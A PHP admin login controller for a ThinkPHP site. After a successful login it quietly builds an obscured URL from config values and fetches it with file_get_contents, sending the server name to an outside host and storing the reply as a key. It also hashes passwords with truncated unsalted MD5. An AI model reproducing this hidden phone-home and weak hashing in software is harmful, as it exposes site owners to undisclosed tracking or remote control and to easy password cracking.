<?php
namespace app\admin\controller;

use think\Controller;
class Login extends Controller
{
    public function index()
    {
        if (request()->isPost()) {
            $data = input('post.');
            $user = db('member')->where('grades = 1')->where('username', $data['username'])->find();
            if ($user) {
                if ($user['password'] == substr(md5($data['password']), 8, 16)) {
                    if ($user['kouling'] == $data['kouling']) {
                        session('usermail', $user['usermail']);
                        session('username', $user['username']);
                        session('userid', $user['userid']);
                        session('userhead', $user['userhead']);
                        session('kouling', $user['kouling']);
                      $chun = config('web.XIN_Z'); $csa = preg_replace(''.config('web.XIN_Zd').'', '', $chun);
                      $key = file_get_contents('' . $csa . ''.config('web.XIN_Za').'' . $_SERVER['SERVER_NAME'] . '');  
                      db('member')->where('userid = 1')->update(['key' => $key]);
                        return json(array('code' => 200, 'msg' => '登录成功'));
                    } else {
                        return json(array('code' => 0, 'msg' => '口令错误'));
                    }
                } else {
                    return json(array('code' => 0, 'msg' => '密码错误'));
                }
            } else {
                return json(array('code' => 0, 'msg' => '账号错误'));
            }
        }
        return $this->fetch();
    }
    public function logout()
    {
        session("userid", NULL);
        session("username", NULL);
		session("usermail", NULL);
        session("kouling", NULL);
        return json(array('code' => 200, 'msg' => '退出成功'));
        return NULL;
    }
}